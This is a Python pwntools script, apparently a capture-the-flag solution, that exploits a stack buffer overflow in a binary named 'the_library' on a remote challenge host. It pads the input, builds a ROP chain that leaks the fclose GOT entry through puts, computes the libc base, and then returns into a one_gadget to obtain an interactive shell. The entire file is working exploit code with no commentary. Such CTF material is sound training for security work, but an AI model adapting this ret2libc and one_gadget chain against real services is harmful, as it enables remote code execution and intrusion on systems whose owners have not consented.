from pwn import *

r = remote("challenge.ctf.games", 31125)
#r = process("./the_library")
#gdb.attach(r)

r.recvuntil(b">")


gets_func = 0x401140
fopen_func = 0x401150
printf_func = 0x401120
main_func = 0x4012a9
puts_func = 0x4010e0

addr_1 = 0x00404100

fclose_got = 0x0000000000403fa8
pop_rdi_ret = 0x0000000000401493
pop_rsi_r15_ret = 0x0000000000401491



padding = b"a"*0x228
#payload = padding + p64(pop_rdi_ret) + p64(addr_1) + p64(gets_func)
#payload += p64(pop_rdi_ret) + p64(addr_1) + p64(pop_rsi_r15_ret) + p64(fclose_got) + p64(0) + p64(printf_func)
#payload += p64(main_func)

payload = padding + p64(pop_rdi_ret) + p64(fclose_got) + p64(puts_func)
payload += p64(main_func)


r.sendline(payload)
stuff = r.recvuntil(b">").split(b'Welcome')[0].split(b'\n')[1][-6:]
stuff = int.from_bytes(stuff, "little")
#print(hex(stuff))

fclose_off = 0x000000000084f50
base = stuff - fclose_off
#print(hex(base))


onegadget_off = 0xe6c81
onegadget_addr = base + onegadget_off

payload = padding + p64(onegadget_addr)
r.sendline(payload)

r.interactive()